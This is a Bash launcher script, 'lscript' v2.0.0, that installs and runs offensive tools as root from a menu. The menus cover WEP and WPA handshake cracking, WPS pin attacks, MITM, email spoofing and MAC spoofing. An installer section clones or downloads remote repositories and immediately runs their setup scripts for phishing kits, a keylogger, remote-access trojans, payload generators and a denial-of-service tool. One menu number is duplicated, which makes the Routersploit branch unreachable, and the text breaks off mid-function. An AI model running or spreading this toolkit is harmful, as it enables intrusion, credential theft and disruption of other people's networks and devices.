#! /bin/bash
VERSION=2.0.0
HOWMANYTOOLS=27
BACKL="0"
#############DEFAULTS###############
function defaults_l
{
#setting yellow-start 
	YS="\e[1;33m"
#setting blue-start 
	BS="\e[0;34m"
#setting color-end
	CE="\e[0m"
#setting red-start
	RS="\e[1;31m"
#setting frequent stings
	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
	PAKT="Press "$YS"any key$CE to"
	PAKTC="Press "$YS"any key$CE to continue..."
	PAKTGB="Press "$YS"any key$CE to go back..."
	TNI=""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 4) Install / reinstall a tool"$CE""
#code to read from keyboard without return
	READAK="read -n 1"
#path for lscript
	LPATH="/root/lscript"
	export LPATH
#path for keyboard shortcuts
	KSPATH=""$LPATH"/ks"
	export KSPATH
#making sure the kspath is set
	if [ ! -d "$KSPATH" ]
	then
		mkdir "$KSPATH"
	fi
}
##############FUNCTIONS#############
function managed_spaces
{
	size=${#WLANN}
	calc=$(( 11-size ))
	numcalc=1
	SPACESN=" "
	while [ $numcalc != $calc ]
	do
		SPACESN=""${SPACESN}" "
		numcalc=$(( numcalc+1 ))
	done
}
function monitor_spaces
{
	size=${#WLANNM}
	calc=$(( 11-size ))
	numcalc=1
	SPACESM=" "
	while [ $numcalc != $calc ]
	do
		SPACESM=""${SPACESM}" "
		numcalc=$(( numcalc+1 ))
	done
}
function banner
{
	echo -e ""
	echo -e "$RS         ██╗      █████╗ ███████╗██╗   ██╗$CE v$VERSION"
	echo -e "$RS         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝$CE"
	echo -e "$RS         ██║     ███████║  ███╔╝  ╚████╔╝ $CE   by "$RS"ARIS MELACHROINOS$CE"
	echo -e "$RS         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE"
	echo -e "$RS    The  ███████╗██║  ██║███████╗   ██║  script$CE"
	echo -e "$RS         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
	echo -e ""$YS"if"$CE") Ifconfig"
	echo -e ""$YS" 1"$CE") Enable $WLANN${SPACESN}"$YS"d1"$CE") Disable $WLANN${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") 1 2 3"
	echo -e ""$YS" 2"$CE") Enable $WLANNM${SPACESM}"$YS"d2"$CE") Disable $WLANNM${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") d1 d2 d3"
	echo -e ""$YS" 3"$CE") Change MAC        "$YS"d3"$CE") Restore original MAC "$RS"|"$CE""$YS"update"$CE") Check for updates"
	if [ -f /usr/bin/anonym8 ]
	then
	echo -e ""$YS" 4"$CE") Enable anonym8    "$YS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
	else
	echo -e ""$RS" 4"$CE") Enable anonym8    "$RS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
	fi
	if [ -f /usr/bin/anonsurf ]
	then
	echo -e ""$YS" 5"$CE") Enable anonsurf   "$YS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
	echo -e ""$YS" 6"$CE") Anonsurf's status "$YS"d6"$CE") Restart anonsurf     "$RS"|"$CE""
	else
	echo -e ""$RS" 5"$CE") Enable anonsurf   "$RS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
	echo -e ""$RS" 6"$CE") Anonsurf's status "$RS"d6"$CE") Restart anonsurf     "$RS"|"$CE""	
	fi
	echo -e ""$YS" 7"$CE") View Public IP   "
	echo -e ""$YS" 8"$CE") View MAC         "
	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL"
	echo -e ""$YS"10"$CE") Handshake    "
	echo -e ""$YS"11"$CE") Find WPS pin "
	echo -e ""$YS"12"$CE") WEP hacking  "
	echo -e ""$YS"13"$CE") MITM         "
	echo -e ""$YS"14"$CE") Metasploit   "   
	echo -e ""$YS" 0"$CE") EXIT"
	echo "Choose: "
	read -e YORNAA
	clear
}
function enable_wlan
{
	echo -e "Enabling $WLANN..."
	rfkill unblock wifi; rfkill unblock all
	(ifconfig $WLANN up &>/dev/null && echo -e "Done" ) || echo -e ""$RS"Error. I can't find your wireless adapter"$CE""
}
function disable_wlan
{
	echo -e "Disabling $WLANN..."
	rfkill unblock wifi; rfkill unblock all
	(ifconfig $WLANN down &>/dev/null && echo -e "Done" ) || echo -e ""$RS"Error. I can't find your wireless adapter."$CE""
}
function stop_monitor
{
	echo -e "Disabling $WLANNM..."
	echo -e "Stopping monitor mode..."
	(airmon-ng stop $WLANNM &>/dev/null && echo -e "Done" ) || echo -e ""$RS"Error stoping monitor mode."$CE""
	echo -e "ok..."
	echo -e "Starting network-manager service..."
	service network-manager start
	echo -e "ok..."
}
function interface_selection
{
echo -e "$YS 1$CE) $WLANN"
echo -e "$YS 2$CE) $WLANNM"
echo -e "$YS 3$CE) Eth0"
echo -e ""$YS"00$CE) Main menu"
echo -e "$YS 0$CE) EXIT"
read -e MYINT
if [ "$MYINT" = "2" ]
then
	MYINT="$WLANNM"
elif [ "$MYINT" = "1" ]
then
	MYINT="$WLANN"
elif [ "$MYINT" = "0" ]
then
	clear
	exit
elif [ "$MYINT" = "00" ]
then
	exec bash "$0"
elif [ "$MYINT" = "3" ]
then
	MYINT="eth0"
else
echo -e "Wrong choice..."
sleep 2
clear
echo -e "EXITING"
sleep 1
exec bash "$0"
fi
export MYINT
}
function change_mac
{
	interface_selection
	clear
	echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
	read -e RORS
	clear
	if [ "$RORS" != "s" ]
	then
		echo -e "Changing mac address of $MYINT to a random one..."
		ifconfig $MYINT down
		macchanger -r $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	else
		echo -e "Enter the MAC you want:"
		read -e SMAC
		echo -e "Changing mac address of $MYINT to $SMAC..."
		ifconfig $MYINT down
		macchanger -m $SMAC $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	fi
}
function set_interface_number
{
while true
do
#~ echo -e "Enter the number of your wireless card(e.g: type "$YS"0"$CE" if wlan0): " 
#~ read INUMB
#~ echo -e "So your wireless interfaces are wlan$INUMB and wlan"$INUMB"mon?"$YNYES": "
#~ read INTCONFNUMB
#~ if [ "$INTCONFNUMB" = "n" ]
#~ then
	#~ clear
	#~ echo -e "Then why did you type that? lol"
	#~ sleep 3
	#~ continue
#~ else
	#~ echo wlan$INUMB > "$LPATH"/wlan.txt
	#~ echo wlan"$INUMB"mon > "$LPATH"/wlanmon.txt
	#~ echo -e "Done "
	#~ sleep 1
	#~ clear
	#~ echo -e "If you want to change it, type "$YS"interface"$CE" any time"
	#~ sleep 3
	#~ echo -e "$PAKTC"
	#~ $READAK	
	#~ break
#~ fi
echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode.(e.g:"$YS"wlan0"$CE"): "
read MANAGED
echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode.(e.g:"$YS"wlan0mon"$CE"): "
read MONITOR
	echo $MANAGED > "$LPATH"/wlan.txt
	echo $MONITOR > "$LPATH"/wlanmon.txt
	echo -e "Done "
	sleep 1
	clear
	echo -e "If you want to change it, type "$YS"interface"$CE" any time"
	sleep 3
	echo -e "$PAKTC"
	$READAK	
	BACKL="1"
	break
done
}
function checkifalready
{
	GOOD="1"
	num=1
	while [ $num -le 20 ]
	do
		if [ "$CHECKKS" = "$num" ]
		then
			GOOD="0"
			echo -e "This shortcut is already in use by the script."
			sleep 3
		fi
		num=$(( num+1 ))
	done
	if [ "$GOOD" = "1" ]
	then
		if [ "$CHECKKS" = "" ] || [ "$CHECKKS" = "if" ] || [ "$CHECKKS" = "ifconfig" ] || [ "$CHECKKS" = "interfaces" ] || [ "$CHECKKS" = "interface" ] || [ "$CHECKKS" = "errors" ] || [ "$CHECKKS" = "00" ] || [ "$CHECKKS" = "exit" ] || [ "$CHECKKS" = "update" ] || [ "$CHECKKS" = "d1" ] || [ "$CHECKKS" = "d2" ] || [ "$CHECKKS" = "d3" ] || [ "$CHECKKS" = "d4" ] || [ "$CHECKKS" = "d5" ] || [ "$CHECKKS" = "d6" ] || [ "$CHECKKS" = "d7" ] || [ "$CHECKKS" = "gg" ] || [ "$CHECKKS" = "ks" ]
		then
			GOOD="0"
			echo -e "This shortcut is already in use by the script."
			sleep 3
		fi
	fi
	if [ "$CHECKKS" = "delete" ]
	then
		GOOD="0"
	fi
	if [ "$GOOD" = "1" ]
	then
		BACKUPTITLE="$TITLE"
		BACKUPNN="$nn"
		num=1
		while [ $num -le "$HOWMANYTOOLS" ]
		do
		nn="$num"
		listshortcuts
		if [ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]
		then
			read KSIFALREADY < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [ "$CHECKKS" == "$KSIFALREADY" ]
			then
				echo -e "Shortcut '"$CHECKKS"' is already in use by "$TITLE""
				GOOD=0
				sleep 3
			fi
		fi
		num=$(( num+1 ))
		done
		nn="$BACKUPNN"
		TITLE="$BACKUPTITLE"
	fi
	clear
}	
function createshortcut
{
if [ ! -d ""$KSPATH"/$TITLE" ]
then
	mkdir "$KSPATH"/"$TITLE"
fi
clear
echo -e "Enter the keyboard shortcut that will open "$TITLE" from lscript's main menu"
echo -e "(e.g: "$YS""$TITLE""$CE")"
echo -e "To delete it , type:   "$YS"delete"$CE""
echo -e ""$YS"back"$CE") Go back"
read CHECKKS
if [ "$CHECKKS" == "back" ]
then
	clear
	BACKKS=1
else
	BACKKS=0
fi
if [ "$BACKKS" == 0 ]
then
	CHECKKSBACKUP="$CHECKKS"
	NAMECDBACKUP="$NAMECD"
	KSSETBACKUP="$KSSET"
	checkifalready
	CHECKKS="$CHECKKSBACKUP"
	NAMECD="$NAMECDBACKUP"
	KSSET="$KSSETBACKUP"
	if [ "$GOOD" = "1" ]
	then
		echo -e "Shortcut is ok.Setting it up..."
		sleep 1
		echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
		echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
		echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
		echo -e "Done!"
		echo -e "$PAKTGB"
		$READAK
		clear
		#break
	else
		clear
		echo -e "Removing shortcut for "$TITLE"..."
		rm -r "$KSPATH"/"$TITLE"
		sleep 1
		echo -e "Done."
		echo -e "$PAKTGB"
		$READAK
		clear
		#break
	fi
fi
}
function listshortcuts
{	
	EXTRA1=""
	if [ "$nn" = "1" ]
	then
		TITLE="Fluxion"
		NAMECD="cd /root/fluxion"
		KSSET="./fluxion"
	elif [ "$nn" = "2" ]
	then
		TITLE="Zirikatu"
		NAMECD="cd /root/zirikatu"
		KSSET="./zirikatu.sh"
	elif [ "$nn" = "3" ]
	then
		TITLE="Wifite"
		NAMECD=""
		KSSET="wifite"
	elif [ "$nn" = "4" ]
	then
		TITLE="Wifiphisher"
		NAMECD=""
		KSSET="wifiphisher"
	elif [ "$nn" = "5" ]
	then
		TITLE="Zatacker"
		NAMECD="cd /root/Zatacker"
		KSSET="./ZT.sh"
	elif [ "$nn" = "6" ]
	then
		TITLE="Morpheus"
		NAMECD="cd /root/morpheus"
		KSSET="./morpheus.sh"
	elif [ "$nn" = "7" ]
	then
		TITLE="Hakku"
		NAMECD="cd /root/hakkuframework"
		KSSET="./hakku"
	elif [ "$nn" = "8" ]
	then
		TITLE="Trity"
		NAMECD=""
		KSSET="trity"
	elif [ "$nn" = "9" ]
	then
		TITLE="Cupp"
		NAMECD="cd /root/cupp"
		KSSET="python cupp.py -i"
	elif [ "$nn" = "10" ]
	then
		TITLE="Dracnmap"
		NAMECD="cd /root/Dracnmap"
		KSSET="./dracnmap-v*.sh"
	elif [ "$nn" = "11" ]
	then
		TITLE="Fern"
		NAMECD=""
		KSSET="fern-wifi-cracker"
	elif [ "$nn" = "12" ]
	then
		TITLE="KickThemOut"
		NAMECD="cd /root/kickthemout"
		KSSET="python kickthemout.py"
	elif [ "$nn" = "13" ]
	then
		TITLE="Ghost-Phisher"
		NAMECD=""
		KSSET="ghost-phisher"
	elif [ "$nn" = "14" ]
	then
		TITLE="Xerxes"
		NAMECD="cd /root/xerxes"
		KSSET="./xerxes"
	elif [ "$nn" = "15" ]
	then
		TITLE="Katana"
		NAMECD=""
		KSSET="ktf.console"
	elif [ "$nn" = "16" ]
	then
		TITLE="Airgeddon"
		NAMECD="cd /root/airgeddon"
		KSSET="./airgeddon.sh"
	elif [ "$nn" = "17" ]
	then
		TITLE="Websploit"
		NAMECD=""
		KSSET="websploit"
	elif [ "$nn" = "18" ]
	then
		TITLE="BeeLogger"
		NAMECD="cd /root/BeeLogger"
		KSSET="python bee.py"
	elif [ "$nn" = "19" ]
	then
		TITLE="Ezsploit"
		NAMECD="cd /root/exsploit"
		KSSET="./ezsploit.sh"
	elif [ "$nn" = "20" ]
	then
		TITLE="Pupy"
		NAMECD="cd /root/pupy/pupy"
		KSSET="./pupysh.py"
	elif [ "$nn" = "21" ]
	then
		TITLE="TheFatRat"
		NAMECD="cd /root/TheFatRat"
		KSSET="./fatrat"
	elif [ "$nn" = "22" ]
	then
		TITLE="Angry_IP_Scanner"
		NAMECD=" "
		KSSET="gnome-terminal --geometry 1x1+9999+9999 -e /usr/bin/ipscan & disown"
	#~ elif [ "$nn" = "23" ]
	#~ then
		#~ TITLE="Sniper"
		#~ NAMECD='read -p 'DOMAIN:' DOMAIN'
		#~ KSSET="sniper $DOMAIN"
	elif [ "$nn" = "23" ]
	then
		TITLE="ReconDog"
		NAMECD="cd /root/ReconDog"
		KSSET="python dog.py"
	elif [ "$nn" = "24" ]
	then
		TITLE="RED_HAWK"
		NAMECD="cd /root/RED_HAWK"
		KSSET="php rhawk.php"
	elif [ "$nn" = "25" ]
	then
		TITLE="Winpayloads"
		NAMECD="cd /root/Winpayloads"
		KSSET="./WinPayloads.py"
	elif [ "$nn" = "26" ]
	then
		TITLE="CHAOS"
		NAMECD="cd /root/CHAOS"
		KSSET="go run CHAOS.go"
	elif [ "$nn" = "27" ]
	then
		TITLE="Routersploit"
		NAMECD="cd /root/routersploit"
		KSSET="./rsf.py"
	fi
}
function reinstall_tools
{
while true
do
	clear
	echo -e "Select a tool to install/reinstall"
	echo -e " "$YS"1"$CE") Fluxion"
	echo -e ""$YS" 2"$CE") Wifite"
	echo -e ""$YS" 3"$CE") Wifiphisher "
	echo -e ""$YS" 4"$CE") Zatacker"
	echo -e ""$YS" 5"$CE") Morpheus"
	echo -e ""$YS" 6"$CE") Osrfconsole"
	echo -e ""$YS" 7"$CE") Hakku"
	echo -e ""$YS" 8"$CE") Trity"
	echo -e ""$YS" 9"$CE") Cupp"
	echo -e ""$YS"10"$CE") Dracnmap"
	echo -e ""$YS"11"$CE") Fern"
	echo -e ""$YS"12"$CE") Netdiscover"
	echo -e ""$YS"13"$CE") KickThemOut"
	echo -e ""$YS"14"$CE") Ghost-Phisher"
	echo -e ""$YS"15"$CE") The Eye"
	echo -e ""$YS"16"$CE") Xerxes"
	echo -e ""$YS"17"$CE") Mdk3-master"
	echo -e ""$YS"18"$CE") Katana Framework"
	echo -e ""$YS"19"$CE") Airgeddon"				
	echo -e ""$YS"20"$CE") Websploit"
	echo -e ""$YS"21"$CE") 4nonimizer       (not in TOOLS anymore)"
	echo -e ""$YS"22"$CE") Openvas"
	echo -e ""$YS"23"$CE") BeeLogger"
	echo -e ""$YS"24"$CE") Ezsploit"
	echo -e ""$YS"25"$CE") Pupy"
	echo -e ""$YS"26"$CE") Zirikatu"
	echo -e ""$YS"27"$CE") WiFi-autopwner"
	echo -e ""$YS"28"$CE") Bully"
	echo -e ""$YS"29"$CE") Anonsurf"
	echo -e ""$YS"30"$CE") Anonym8"
	echo -e ""$YS"31"$CE") TheFatRat"
	echo -e ""$YS"32"$CE") Angry IP Scanner"
	echo -e ""$YS"33"$CE") Sniper"
	echo -e ""$YS"34"$CE") ReconDog"
	echo -e ""$YS"35"$CE") RED HAWK"
	echo -e ""$YS"36"$CE") WinPayloads"
	echo -e ""$YS"37"$CE") Shellter"
	echo -e ""$YS"38"$CE") CHAOS"
	echo -e ""$YS"39"$CE") Routersploit"
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS" 0"$CE") Exit"
	echo -e "Choose: "
	read REIN
	clear
	if [ "$REIN" = "1" ]
	then
		if [ -d "/root/fluxion" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/fluxion
		fi
		echo -e "Installing fluxion"
		echo -e "Tool by Deltaxflux"
		sleep 1
		cd
		wget https://fluxion.tk/fluxion-unstable.zip
		apt-get install unzip
		clear
		unzip /root/fluxion*.zip -d /root
		cd /root/fluxion/install
		chmod +x install.sh
		./install.sh					
	elif [ "$REIN" = "2" ]
	then
		apt-get install wifite
	elif [ "$REIN" = "3" ]
	then
		if [ -d "/root/wifiphisher" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/wifiphisher
		fi
		echo -e "Installing Wifiphisher"
		echo -e "Tool idea by Dan McInerney"
		sleep 1
		git clone https://github.com/wifiphisher/wifiphisher.git
		cd wifiphisher
		sudo python setup.py install
		sleep 1
	elif [ "$REIN" = "4" ]
	then
		echo -e "I cannot install Zatacker. Please google how to do that yourself."
		echo -e "PAKTGB"
		read
	elif [ "$REIN" = "5" ]
	then
		if [ -d "/root/morpheus" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/morpheus
		fi				
		echo -e "Installing Morpheus"
		echo -e "Tool by Pedro ubuntu  [ r00t-3xp10it ]"
		sleep 1
		cd
		git clone https://github.com/r00t-3xp10it/morpheus.git
		cd morpheus
		chmod +x morpheus.sh
	elif [ "$REIN" = "6" ]
	then
		pip install osrframework			
	elif [ "$REIN" = "7" ]
	then
		if [ -d "/root/hakkuframework" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/hakkuframework
		fi		
		echo -e "Installing Hakku"
		echo -e "Tool by 4shadoww"
		sleep 1
		cd
		git clone https://github.com/4shadoww/hakkuframework.git
		cd hakkuframework
		chmod +x hakku
		chmod +x install							
	elif [ "$REIN" = "8" ]
	then
		if [ -d "/root/Trity" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Trity
		fi		
		echo -e "Installing Trity"
		echo -e "Tool by Toxic-ig"
		sleep 1
		git clone https://github.com/toxic-ig/Trity.git
		cd Trity
		sudo python install.py							
	elif [ "$REIN" = "9" ]
	then
		if [ -d "/root/cupp" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/cupp
		fi			
		echo -e "Installing Cupp"
		echo -e "Tool by Muris Kurgas"
		sleep 1
		cd
		git clone https://github.com/Mebus/cupp.git
		cd cupp
		chmod +x cupp.py	
	elif [ "$REIN" = "10" ]
	then
		if [ -d "/root/Dracnmap" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Dracnmap
		fi			
		echo -e "Installing Dracnmap"
		echo -e "Tool by Edo -maland-"
		cd
		git clone https://github.com/Screetsec/Dracnmap.git
		cd Dracnmap
		chmod +x Dracnmap.sh	
	elif [ "$REIN" = "11" ]
	then
		if [ -d "/root/Fern-Wifi-Cracker" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Fern-Wifi-Cracker
		fi		
		echo -e "Installing Fern"
		echo -e "Tool by Savio-code"
		sleep 1
		cd 
		svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
		cd Fern-Wifi-Cracker
		chmod +x execute.py		
	elif [ "$REIN" = "12" ]
	then
		apt-get install netdiscover			
	elif [ "$REIN" = "13" ]
	then
		if [ -d "/root/kickthemout" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kickthemout
		fi		
		echo -e "Installing Kichthemout"
		echo -e "Tool by Nikolaos Kamarinakis & David Schütz"
		sleep 2
		apt-get install nmap
		git clone https://github.com/k4m4/kickthemout.git
		cd kickthemout/
		sudo python -m pip install -r requirements.txt
	elif [ "$REIN" = "14" ]
	then
		if [ -d "/root/ghost-phisher" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ghost-phisher
		fi			
		echo -e "Installing Ghost-Phisher"
		echo -e "Tool by Savio-code"
		sleep 1
		cd
		git clone https://github.com/savio-code/ghost-phisher.git
		sleep 1
		chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
	elif [ "$REIN" = "15" ]
	then
		if [ -d "/root/The-Eye" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/The-Eye
		fi			
		echo -e "Installing The Eye"
		echo -e "Tool by EgeBalci"
		sleep 1
		cd
		git clone https://github.com/EgeBalci/The-Eye.git
		cd The-Eye
		chmod +x TheEye	
	elif [ "$REIN" = "16" ]
	then
		if [ -d "/root/xerxes" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/xerxes
		fi			
		echo -e "Installing Xerxes"
		echo -e "Tool by zanyarjamal"
		cd
		git clone https://github.com/zanyarjamal/xerxes
		cd xerxes
		gcc xerxes.c -o xerxes	
	elif [ "$REIN" = "17" ]
	then
		if [ -d "/root/mdk3-master" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/mdk3-master
		fi				
		echo -e "Installing Mdk3-master"
		echo -e "Tool by Musket Developer"
		cd
		git clone https://github.com/wi-fi-analyzer/mdk3-master.git
		cd /root/mdk3-master
		make
		make install
	elif [ "$REIN" = "18" ]
	then
		if [ -d "/root/KatanaFramework" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/KatanaFramework
		fi				
		echo -e "Installing Katana framework"
		echo -e "Tool by PowerScript"
		cd
		git clone https://github.com/PowerScript/KatanaFramework.git
		cd KatanaFramework
		sh dependencies
		python install					
	elif [ "$REIN" = "19" ]
	then
		if [ -d "/root/airgeddon" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/airgeddon
		fi
			echo -e "Installing..."
			sleep 1
			echo -e "Installing Airgeddon"
			echo -e "Tool by v1s1t0r1sh3r3"
			cd
			git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
			cd airgeddon
			chmod +x airgeddon.sh
	elif [ "$REIN" = "20" ]
	then
		apt-get install websploit			
	elif [ "$REIN" = "21" ]
	then
		if [ -d "/root/4nonimizer" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/4nonimizer
		fi		
		echo -e "Installing 4nonimizer"
		echo -e "Tool by Hackplayers"
		cd
		git clone https://github.com/Hackplayers/4nonimizer.git
		cd 4nonimizer
		chmod +x 4nonimizer
		./4nonimizer install
		clear
		cd
		apt-get install python-pip
		apt-get install php-curl
		gem install pcaprub
		gem install packetfu	
				elif [ "$REIN" = "22" ]
				then
		apt-get install openvas
		openvas-setup
	elif [ "$REIN" = "23" ]
	then
		if [ -d "/root/BeeLogger" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/BeeLogger
		fi	
		echo -e "Installing BeeLogger"
		echo -e "Tool by Alisson Moretto - 4w4k3"
		cd
		git clone https://github.com/4w4k3/BeeLogger.git
		cd BeeLogger
		chmod +x install.sh
		./install.sh
		cd
		apt-get install python-pip
		apt-get install php-curl
		gem install pcaprub
		gem install packetfu
		clear
	elif [ "$REIN" = "24" ]
	then
		if [ -d "/root/ezsploit" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ezsploit
		fi				
		echo -e "Installing Ezsploit"
		echo -e "Tool by rand0m1ze"
		git clone https://github.com/rand0m1ze/ezsploit.git
		cd ezsploit/
		chmod +x ezsploit.sh
	elif [ "$REIN" = "25" ]
	then
		if [ -d "/root/pupy" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/pupy
		fi			
		echo -e "Installing Pupy"
		echo -e "Tool by n1nj4sec"
		cd
		git clone https://github.com/n1nj4sec/pupy.git
		cd pupy
		git submodule init
		git submodule update
		pip install -r pupy/requirements.txt
	elif [ "$REIN" = "26" ]
	then
		if [ -d "/root/zirikatu" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/zirikatu
		fi		
		echo -e "Installing Zirikatu"
		echo -e "Tool by pasahitz"
		cd
		git clone https://github.com/pasahitz/zirikatu.git
		cd zirikatu
		chmod +x zirikatu.sh
	elif [ "$REIN" = "27" ]
	then
		if [ -d "/root/WiFi-autopwner" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/WiFi-autopwner
		fi		
		echo -e "Installing WiFi-autopwner"
		echo -e "Tool by Mi-Al"
		cd
		git clone https://github.com/Mi-Al/WiFi-autopwner.git
	elif [ "$REIN" = "28" ]
	then
		if [ -d "/root/bully" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/bully
		fi				
		echo -e "Installing Bully"
		echo -e "Tool by Aanarchyy"
		cd
		git clone https://github.com/aanarchyy/bully.git
		cd bully
		cd src
		make
		sudo make install		
	elif [ "$REIN" = "29" ]
	then
		if [ -d "/root/kali-anonsurf" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kali-anonsurf
		fi		
		cd
		echo -e "Installing Anonsurf"
		echo -e "Tool by Und3rf10w"
		git clone https://github.com/Und3rf10w/kali-anonsurf.git
		cd kali-anonsurf
		chmod +x installer.sh
		./installer.sh
		sleep 1
	elif [ "$REIN" = "30" ]
	then
		if [ -d "/root/anonym8" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/anonym8
		fi		
		echo -e "Installing Anonym8"
		echo -e "Tool by HiroshiManRise"
		git clone https://github.com/HiroshiManRise/anonym8.git
		cd anonym8
		chmod +x INSTALL.sh
		./INSTALL.sh
		sleep 1	
	elif [ "$REIN" = "31" ]
	then	
		if [ -d "/root/TheFatRat" ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/TheFatRat
		fi	
		echo -e "Installing TheFatRat"
		echo -e "Tool by Screetsec"
		cd
		git clone https://github.com/Screetsec/TheFatRat.git
		cd TheFatRat
		chmod +x setup.sh && ./setup.sh	
	elif [ "$REIN" = "32" ]
	then
		cd
		if [ -f "/root/ipscan_*" ]
		then
			echo -e "Removing old file"
			sleep 2
			rm /root/ipscan_*
		fi
		echo -e "Downloading angryipscanner"
		sleep 2
		wget https://github.com/angryip/ipscan/releases/download/3.5.1/ipscan_3.5.1_amd64.deb
		echo -e "Installing..."
		dpkg -i ipscan_*
		echo -e "Done"
		sleep 1
	elif [ "$REIN" = "33" ]
	then
		if [ -d /root/Sn1per ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Sn1per
		fi
		echo -e "Installing Sn1per"
		echo -e "Tool by 1N3"
		cd
		git clone https://github.com/1N3/Sn1per.git
		cd /root/Sn1per
		chmod +x install.sh
		./install.sh
	elif [ "$REIN" = "34" ]
	then
		if [ -d /root/ReconDog ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ReconDog
		fi
		cd
		echo -e "Installing ReconDog"
		echo -e "Tool by UltimateHackers"
		git clone https://github.com/UltimateHackers/ReconDog.git
	elif [ "$REIN" = "35" ]
	then
		if [ -d /root/RED_HAWK ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/RED_HAWK
		fi
		cd
		echo -e "Installing RED HAWK"
		echo -e "Tool by Tuhinshubhra"
		git clone https://github.com/Tuhinshubhra/RED_HAWK.git
	elif [ "$REIN" = "36" ]
	then
		if [ -d /root/Winpayloads ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Winpayloads
		fi
		cd
		echo -e "Installing Winpayloads"
		echo -e "Tool by Nccgroup"
		git clone https://github.com/nccgroup/Winpayloads.git
		cd /root/Winpayloads
		chmod +x setup.sh
		./setup.sh
		cd
	elif [ "$REIN" = "37" ]
	then
		apt-get install shellter
		sleep 2
	elif [ "$REIN" = "38" ]
	then
		apt install golang upx-ucl -y
		cd
		if [ -d /root/CHAOS ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/CHAOS
		fi
		git clone https://github.com/tiagorlampert/CHAOS.git
	elif [ "$REIN" = "38" ]
	then
		if [ -d /root/routersploit ]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/routersploit
		fi
		cd
		echo -e "Installing routersploit"
		echo -e "Tool by reverse-shell"
		git clone https://github.com/reverse-shell/routersploit
		cd /root/routersploit
		pip install -r requirements.txt
		cd
	elif [ "$REIN" = "back" ]
	then
		clear
		break
	elif [ "$REIN" = "00" ]
	then	
		exec bash "$0"
	elif [ "$REIN" = "0" ]
	then
		clear
		exit
	fi
	done
}
function errors_menu
{
echo -e "-----------------------------"$RS"ERRORS"$CE"------------------------------"
